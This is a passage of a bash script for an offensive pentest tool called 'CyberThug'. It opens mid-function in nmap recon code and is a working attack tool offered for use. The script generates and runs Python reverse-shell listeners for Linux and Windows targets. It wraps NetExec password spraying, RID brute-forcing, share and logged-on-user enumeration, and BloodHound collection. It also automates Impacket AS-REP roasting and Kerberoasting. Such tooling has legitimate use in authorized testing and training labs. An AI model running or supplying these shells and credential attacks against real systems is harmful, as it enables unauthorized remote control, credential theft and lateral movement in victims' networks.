                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"    
                web_1   
                network 
            fi 
         else
            echo -e "\e[1;36m[+]--- Second Attempt ---[+]\e[0m"
            echo ""
            if ping -c25 $DOMAIN 2>/dev/null; then
               if [ "$flag_6" = true ]; then
                  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
                  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"    
                  web_1  
                  network 
               else
                  nmap -A -vv -Pn $DOMAIN
                  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
                  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"    
                  web_1     
                  network 
               fi
            else
                echo -e "\e[1;31m[+]--- The Target Is Not Reachable ---[+]\e[0m"
                exit 1
            fi
         fi
     fi 
}
help(){
echo "
╔════════════════════════════════════════════════════╗
║                ⚡ CyberThug ⚡                     ║
╚════════════════════════════════════════════════════╝

Usage: 
    cyberthug [ip] [domain] flags
    cyberthug [ip] flags
    cyberthug [domain] flags
    cyberthug flags 
Flags:
    --no-http: skip port 80 
    --no-https: skip port 443  
    --no-recon: skip recon 
    --no-network: skip network 
    --no-ping: skip ping 
    --no-portscan: skip port scanning 
    -h [help] : display this help menu 
    -t [tool] : Use a specific tool
"
}
trap 'next_step=true' SIGINT
if [ "$next_step" = true ]; then
  next_step=false
fi
set -o history
read_input() {
    local var_name="$1"
    local prompt="$2"
    local default="$3"
    read -e -i "$default" -p $'\033[35m'"$prompt"$'\033[0m' "$var_name"
    history -s "${!var_name}"
}
if [[ "$1" == "-t" ]]; then
    banner(){
     echo -e "\e[1;36m
     ╔════════════════════════════════════════════════════╗
     ║                ⚡ CyberThug ⚡                     ║
     ╚════════════════════════════════════════════════════╝
     \e[0m"
       echo -e "\033[35m
           1) nc
           2) python_server
           3) smbclient
           4) nxc
           5) GetNPUsers.py
           6) GetUserSPNs.py
       \033[0m"
       echo ""
       read_input tool $'\033[35m# \033[0m'
    }
    banner
    if [[ "$tool" == "1" ]]; then
           while true; do 
               echo -e "\033[35m
	        _ __   ___
 	       | '_ \ / __|
	       | | | | (__
     	       |_| |_|\___|
               \033[0m"
               echo "
                  1) Linux
                  2) Windows
               "
               echo ""
               read_input choice $'\033[35m# \033[0m'
               if [[ "$choice" == ".." ]]; then
                    exec "$0" "$@"  
               elif [[ "$choice" == "1" ]]; then
                     read_input port $'\033[35mEnter The Port : \033[0m'
                     if [[ "$port" == "exit" ]]; then
                         exit 0
                     fi
                     DATE=$(date +%F_%H-%M-%S)
                     PYFILE="/tmp/reverse_shell_Linux_${DATE}.py"
                     cat > "$PYFILE" << EOF
import socket
import threading
import sys
import os
import termios
import tty
import time

HOST = '0.0.0.0'
PORT = $port
PTY_CMD = "script -qc /bin/bash /dev/null\n"
FALLBACK_CMD = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
BASIC_CMD = "/bin/bash -i\n"
SCRIPT_CHECK_CMD = "which script\n"
PYTHON_CHECK_CMD = "which python3\n"

def recv_from_client(conn):
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
    except Exception:
        pass

def send_to_client(conn):
    try:
        while True:
            data = os.read(sys.stdin.fileno(), 1024)
            if not data:
                break
            conn.sendall(data)
    except Exception:
        pass

def check_cmd(conn, cmd_to_check, keyword):
    buffer = []
    conn.sendall(cmd_to_check.encode())
    time.sleep(1)

    try:
        conn.settimeout(0.5)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buffer.append(data)
    except socket.timeout:
        pass
    finally:
        conn.settimeout(None)

    response = b''.join(buffer).decode(errors='ignore').lower()
    return keyword in response
def main():
    old_settings = None  
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen(1)
            print(" ")
            print(f"\033[92m[*] Listening on {HOST}:{PORT}...\033[0m")

            try:
                conn, addr = s.accept()
            except KeyboardInterrupt:
                sys.exit(0)

            print(f"[*] Connection from {addr}")

            old_settings = termios.tcgetattr(sys.stdin.fileno())
            tty.setraw(sys.stdin.fileno())

            has_script = check_cmd(conn, SCRIPT_CHECK_CMD, '/')
            has_python = check_cmd(conn, PYTHON_CHECK_CMD, '/')

            if has_script:
                conn.sendall(PTY_CMD.encode())
            elif has_python:
                conn.sendall(FALLBACK_CMD.encode())
            else:
                conn.sendall(BASIC_CMD.encode())

            t_recv = threading.Thread(target=recv_from_client, args=(conn,), daemon=True)
            t_send = threading.Thread(target=send_to_client, args=(conn,), daemon=True)
            t_recv.start()
            t_send.start()

            t_recv.join()
            t_send.join()

    finally:
        if old_settings:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)
        print("\n[*] Connection closed Terminal restored")

if __name__ == "__main__":
    main()
EOF
               python3 "$PYFILE"
               elif [[ "$choice" == "2" ]]; then
                      read_input port $'\033[35mEnter The Port : \033[0m'
                      if [[ "$port" == "exit" ]]; then
                          exit 0
                      else
                         DATE=$(date +%F_%H-%M-%S)
                         PYFILE="/tmp/reverse_shell_Windows_${DATE}.py"
                         cat > "$PYFILE" << EOF
import socket
import signal
from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.history import FileHistory

history_file = ".shell_history"
session = PromptSession(history=FileHistory(history_file))

def ignore_signal(signum, frame):
    pass

def handle_client(client_socket):
    try:
        while True:
            try:
                cmd = session.prompt("Shell> ")
            except KeyboardInterrupt:
                print("")  
                continue

            if not cmd.strip():
                continue

            client_socket.send(cmd.encode() + b"\n")

            if cmd.lower() == "exit":
                print("[*] Exiting shell session.")
                client_socket.close()
                break

            response = b""
            client_socket.settimeout(1.0)
            try:
                while True:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            print(response.decode(errors="ignore"))
    except (ConnectionResetError, BrokenPipeError):
        print("[*] Connection closed by remote host.")
    finally:
        client_socket.close()

def main():
    signal.signal(signal.SIGINT, ignore_signal)   
    signal.signal(signal.SIGTSTP, ignore_signal)  

    server_ip = "0.0.0.0"
    server_port = $port 

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(" ")   
    print(f"\n\033[92m[*] Listening on {server_ip}:{server_port}...\033[0m")

    client_socket, addr = server.accept()
    print(f"[*] Connection from {addr[0]}:{addr[1]}")

    handle_client(client_socket)

if __name__ == "__main__":
    main()
EOF
                         python3 "$PYFILE"
                      fi
               elif [[ "$choice"  == "exit" ]]; then
                    exit 0
               else
                  echo ""
                  echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
           done
    elif [[ "$tool" == "2" ]]; then
        trap ctrlc_handler INT
        ctrlc_handler() {
        if [ "$server_pid" != "" ] && kill -0 "$server_pid" 2>/dev/null; then
            echo -e "\n\e[0;31mStopping Python server ...\e[0m"
            kill "$server_pid"
            wait "$server_pid" 2>/dev/null
            server_pid=""
            current_dir="$server_dir"
            echo -e "\e[0;32mReturned to folder selection in $current_dir\e[0m\n"
        else
            echo -e "\n\e[0;31mExiting tool\e[0m"
            exit 0
        fi
        }
        current_dir="$HOME"
        server_dir=""
        server_pid=""
        prev_choice=""
        prev_port="8000"
        while true; do
        echo -e "\033[35m
         ____        _   _                 ____
        |  _ \ _   _| |_| |__   ___  _ __ / ___|  ___ _ ____   _____ _ __
        | |_) | | | | __| '_ \ / _ \| '_ \\___ \ / _ \ '__\ \ / / _ \ '__|
        |  __/| |_| | |_| | | | (_) | | | |___) |  __/ |   \ V /  __/ |
        |_|    \__, |\__|_| |_|\___/|_| |_|____/ \___|_|    \_/ \___|_|
               |___/

        \033[0m"
        while true; do
            echo -e "\e[0;36mCurrent directory:\e[0;32m $current_dir\e[0m"
            echo ""
            echo -e "\e[1;33mFolders:\e[0m"
            echo ""
            dirs=()
            files=()
            i=1
            for d in "$current_dir"/*/ ; do
            [ -d "$d" ] || continue
            dir_name="${d%/}"
            dir_name="${dir_name##*/}"
            echo -e "\e[1;33m[$i]\e[0m $dir_name"
            dirs+=("$dir_name")
            ((i++))
            done
            echo ""
            echo -e "\e[1;34mFiles:\e[0m"
            echo ""
            for f in "$current_dir"/* ; do
            [ -f "$f" ] || continue
            file_name="${f##*/}"
            echo -e "\e[1;34m- $file_name\e[0m"
            files+=("$file_name")
            done
            echo ""
            echo -e "\e[1;35m[!] Options"
            echo "-----"
            echo -e "\e[1;33m[.]\e[0m a step back"
            echo -e "\e[1;33m[s]\e[0m Select this directory to start server here"
            echo ""
            read -e -p $'\e[0;32m# \e[0m' choice
            if [[ "$choice" == "exit" ]]; then
                 exit 0
            elif [[ "$choice" == ".." ]]; then
                    exec "$0" "$@"  
            fi
            if [[ -z "$choice" && -n "$prev_choice" ]]; then
            choice="$prev_choice"
            echo "(Using previous input)"
            fi
            if [ -n "$choice" ]; then
            history -s "$choice"
            prev_choice="$choice"
            fi

            if [[ "$choice" == "s" ]]; then
            server_dir="$current_dir"
            break
            elif [[ "$choice" == "." ]]; then
            if [[ "$current_dir" == "/" ]]; then
                echo -e "\e[0;31mAlready at root directory, cannot go back further\e[0m"
            else
                current_dir=$(dirname "$current_dir")
            fi
            elif [[ "$choice" =~ ^[0-9]+$ ]]; then
            if (( choice >= 1 && choice <= ${#dirs[@]} )); then
                current_dir="$current_dir/${dirs[$((choice-1))]}"
            else
                echo -e "\e[0;31mInvalid folder number\e[0m"
            fi
            else
            echo -e "\033[35m[!] Enter a Valid Choice\033[0m"
            fi
            echo
        done
        read -e -p $'\e[0;32mEnter a port number (default 8000): \e[0m' port

        if [[ -z "$port" && -n "$prev_port" ]]; then
            port="$prev_port"
            echo "(Using previous port)"
        fi
        if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
            echo -e "\e[0;31mInvalid port number .. Using default 8000\e[0m"
            port=8000
        fi
        history -s "$port"
        prev_port="$port"
        echo -e "\e[0;36mStarting Python HTTP server in directory\e[0;32m $current_dir \e[0;36mon port\e[0;32m $port\e[0m"
        cd "$current_dir" || { echo -e "\e[0;31mFailed to enter directory\e[0m"; exit 1; }

        if command -v python3 &>/dev/null; then
            python3 -m http.server "$port" &
        elif command -v python &>/dev/null; then
            python -m http.server "$port" &
        else
            echo -e "\e[0;31mPython not found\e[0m"
            exit 1
        fi
        server_pid=$!
        wait "$server_pid"
        server_pid=""
        echo -e "\e[1;33mPython server stopped\e[0m\n"
        done
    elif [[ "$tool" == "3" ]]; then
       while true; do     
         echo -e "\033[35m
                             _          _ _            _   
               ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_ 
              / __| '_ \` _ \\| '_ \\ / __| | |/ _ \\ '_ \\| __|
              \\__ \\ | | | | | |_) | (__| | |  __/ | | | |_ 
              |___/_| |_| |_|_.__/ \\___|_|_|\\___|_| |_|\\__|
         \033[0m"
               echo "
                    1) smbclient -L domain
                    2) smbclient -L domain -U user%password
                    3) smbclient \\\\\\\\domain\\\\share -U user%password
               "
               read_input number $'\033[35m# \033[0m'
               if [[ "$number" == ".." ]]; then
                    exec "$0" "$@"  
               elif [[ "$number" == "1" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient -L $Domain --[+]\033[0m"
                  echo ""
                  smbclient -L $Domain 
                  echo ""
               elif [[ "$number" == "2" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient -L $Domain -U $User%$Password --[+]\033[0m"
                  echo ""
                  smbclient -L $Domain -U $User%$Password
                  echo ""
              elif [[ "$number" == "3" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input Share $'\033[35mEnter The Share : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running smbclient \\\\\\\\$Domain\\\\$Share -U $User%$Password --[+]\033[0m"
                  echo ""
                  smbclient \\\\$Domain\\$Share -U $User%$Password
                  echo ""
               elif [[ "$number" == "exit" ]]; then
                    exit 0
               else
                   echo ""
                   echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
       done
    elif [[ "$tool" == "4" ]]; then
       while true; do 
         echo  -e "\033[35m
                   _    __  ______  
                  | \ | \ \/ / ___| 
                  |  \| |\  / |     
                  | |\  |/  \ |___  
                  |_| \_/_/\_\____| 
         \033[0m"
	       echo "
        	  1) nxc smb domain -u 'user' -p 'password' --continue-on-success
          	  2) nxc smb domain -u 'user' -p 'password' --users
                  3) nxc smb domain -u 'user' -p 'password' --rid-brute
                  4) nxc smb domain -u 'user' -p 'password' --shares
                  5) nxc smb domain -u 'user' -p 'password' --loggedon-users
                  6) nxc smb domain -u 'user' -p 'password' -M enum_av
                  7) nxc winrm domain -u 'user' -p 'password'
          	  8) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
               "
       	       read_input number $'\033[35m# \033[0m'
               if [[ "$number" == ".." ]]; then
                    exec "$0" "$@"  
               elif [[ "$number" == "1" ]]; then
           	  read_input Domain $'\033[35mEnter The Domain : \033[0m'
          	  read_input User $'\033[35mEnter The User : \033[0m' 
          	  read_input Password $'\033[35mEnter The Password : \033[0m'
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --continue-on-success --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --continue-on-success
                  echo ""
               elif [[ "$number" == "2" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --users --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --users
                  echo ""
               elif [[ "$number" == "3" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --rid-brute --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --rid-brute
                  echo ""  
       	       elif [[ "$number" == "4" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
          	  echo ""
          	  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --shares --[+]\033[0m"
                  echo ""
          	  nxc smb $Domain -u $User -p $Password --shares 
          	  echo ""
               elif [[ "$number" == "5" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --loggedon-users --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --loggedon-users
                  echo ""
               elif [[ "$number" == "6" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M enum_av --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M enum_av
                  echo ""
               elif [[ "$number" == "7" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc winrm $Domain -u $User -p $Password --[+]\033[0m"
                  echo ""
                  nxc winrm $Domain -u $User -p $Password  
                  echo ""
               elif [[ "$number" == "8" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Ip $'\033[35mEnter The Dns-server Ip : \033[0m' 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --bloodhound --collection all --dns-server $Ip --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password --bloodhound --collection all --dns-server $Ip
                  echo ""
               elif [[ "$number" == "exit" ]]; then
                    exit 0
               else
                  echo ""
                  echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
       done
    elif [[ "$tool" = "5" ]]; then
      while true; do
           echo  -e "\033[35m
	    ____      _   _   _ ____  _   _                                 
     	   / ___| ___| |_| \ | |  _ \| | | |___  ___ _ __ ___   _ __  _   _ 
	  | |  _ / _ \ __|  \| | |_) | | | / __|/ _ \ '__/ __| | '_ \| | | |
	  | |_| |  __/ |_| |\  |  __/| |_| \__ \  __/ |  \__ \_| |_) | |_| |
 	   \____|\___|\__|_| \_|_|    \___/|___/\___|_|  |___(_) .__/ \__, |
                                                    	       |_|    |___/ 
           \033[0m"
           echo "
               1) GetNPUsers.py -no-pass -usersfile users.txt domain/
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m'  
               read_input users_file $'\033[35mEnter The Users_File : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile $users_file $Domain/ --[+]\033[0m"
               echo ""
               GetNPUsers.py -no-pass -usersfile $users_file $Domain/
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" = "6" ]]; then
      while true; do
           echo  -e "\033[35m
	    ____      _   _   _               ____  ____  _   _                   
	   / ___| ___| |_| | | |___  ___ _ __/ ___||  _ \| \ | |___   _ __  _   _ 
	  | |  _ / _ \ __| | | / __|/ _ \ '__\___ \| |_) |  \| / __| | '_ \| | | |
	  | |_| |  __/ |_| |_| \__ \  __/ |   ___) |  __/| |\  \__ \_| |_) | |_| |
 	   \____|\___|\__|\___/|___/\___|_|  |____/|_|   |_| \_|___(_) .__/ \__, |
                       	                                             |_|    |___/ 
           \033[0m"
           echo "
               1) GetUserSPNs.py domain/user:password -request
               2) GetUserSPNs.py -no-preauth "user" -usersfile users.txt -dc-host "DC" domain/
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m'
               read_input User $'\033[35mEnter The User : \033[0m'  
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- Running GetUserSPNs.py $Domain/$User:$Password -request --[+]\033[0m"
               echo ""
               GetUserSPNs.py $Domain/$User:$Password -request
               echo ""
           elif [[ "$number" == "2" ]]; then
               read_input User $'\033[35mEnter The User : \033[0m'  
               read_input users_file $'\033[35mEnter The Users_File : \033[0m'
               read_input DC $'\033[35mEnter The DC : \033[0m'
               read_input Domain $'\033[35mEnter The Domain : \033[0m'
               echo ""
               echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth $User -usersfile $users_file -dc-host "$DC" $Domain/ --[+]\033[0m"
               echo ""
               GetUserSPNs.py -no-preauth $User -usersfile $users_file -dc-host "$DC" $Domain/
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" == "exit" ]]; then
         exit 0
    elif [[ -z "$tool" ]]; then
         exec "$0" "$@" 
    else
        echo
        echo -e "\e[1;36m[!] Enter a Valid option\033[0m"
        exec "$0" "$@" 
    fi
fi
declare -A seen_flags
declare -a valid_flags=("--no-http" "--no-https" "--no-recon" "--no-network" "--no-ping" "--no-portscan")
in_array() {
    local needle=$1
    shift
    for element in "$@"; do
        if [[ "$element" == "$needle" ]]; then
            return 0
        fi
    done
    return 1
}
if [[ "$2" == --* ]]; then
    for arg in "${@:2}"; do
       arg=$(echo "$arg" | xargs)  
       if [[ -z "$arg" ]]; then
           continue
       fi
       if in_array "$arg" "${valid_flags[@]}"; then
           if [[ -n "${seen_flags[$arg]}" ]]; then
               echo -e "\e[1;31m[+]--- Flag '$arg' is repeated ---[+]\e[0m"
               exit 1
           else
               seen_flags["$arg"]=true
           fi

           case "$arg" in
               "--no-http") flag_1=true ;;
               "--no-https") flag_2=true ;;
               "--no-recon") flag_3=true ;;
               "--no-network") flag_4=true ;;
               "--no-ping") flag_5=true ;;
               "--no-portscan") flag_6=true ;;
           esac
       else
           echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
           exit 1
       fi
    done
else
    for arg in "${@:3}"; do
       arg=$(echo "$arg" | xargs)  
       if [[ -z "$arg" ]]; then
           continue
       fi
       if in_array "$arg" "${valid_flags[@]}"; then
           if [[ -n "${seen_flags[$arg]}" ]]; then
               echo -e "\e[1;31m[+]--- Flag '$arg' is repeated ---[+]\e[0m"
               exit 1
           else
               seen_flags["$arg"]=true
           fi

           case "$arg" in
               "--no-http") flag_1=true ;;
               "--no-https") flag_2=true ;;
               "--no-recon") flag_3=true ;;
               "--no-network") flag_4=true ;;
               "--no-ping") flag_5=true ;;
               "--no-portscan") flag_6=true ;;
           esac
       else
           echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
           exit 1
       fi
    done
fi
if [ -z "$1" ]; then
    echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
    exit 1
fi
if [ "$1" == "-h" ]; then
    help
    exit 1
fi
if [[ "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
    exit 1
fi
if [ "$2" != "" ]; then
    if [[ "$2" == --* ]]; then
        DOMAIN=$1
        HOSTS_ENTRY=""
    else
        DOMAIN=$2
        HOSTS_ENTRY=$1
        echo "$1 $2" | sudo tee -a /etc/hosts > /dev/null
        echo -e "\e[1;32m$1 $2 ⇒  /etc/hosts\e[0m"
        echo "--------------------------"
    fi
else
    DOMAIN=$1
    HOSTS_ENTRY=""
fi 
if [ ! -d "$HOME/CyberThug_output" ]; then
    mkdir -p "$HOME/CyberThug_output"
    echo "" 
    echo -e "\e[1;3m\e[1;32m[+]-- $HOME/CyberThug_output Folder Created --[+]\e[0m\e[0m"
    echo ""

fi

main
echo ""
rm $HOME/Downloads/tools/Files/*.state 2>/dev/null ; rm -r $HOME/Downloads/tools/Files/reports 2>/dev/null
echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"


# TEMPLATE
# ---------------------------------
#    elif [[ "$tool" = "5" ]]; then
#      while true; do
#           echo  -e "\033[35m
#           \033[0m"
#           echo "
#               1)
#           "
#           read_input number $'\033[35m# \033[0m'
#           if [[ "$number" == ".." ]]; then
#               exec "$0" "$@"
#           elif [[ "$number" == "1" ]]; then
#               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
#               read_input User $'\033[35mEnter The User : \033[0m' 
#               read_input Password $'\033[35mEnter The Password : \033[0m' 
#               echo ""
#               echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --users --[+]\033[0m"
#               echo ""
#               nxc smb $Domain -u $User -p $Password --users
#               echo ""
#           elif [[ "$number" == "exit" ]]; then
#               exit 0
#           else
#               echo ""
#               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
#           fi
#      done
#--------------------------------------
#    elif [[ "$tool" == "exit" ]]; then
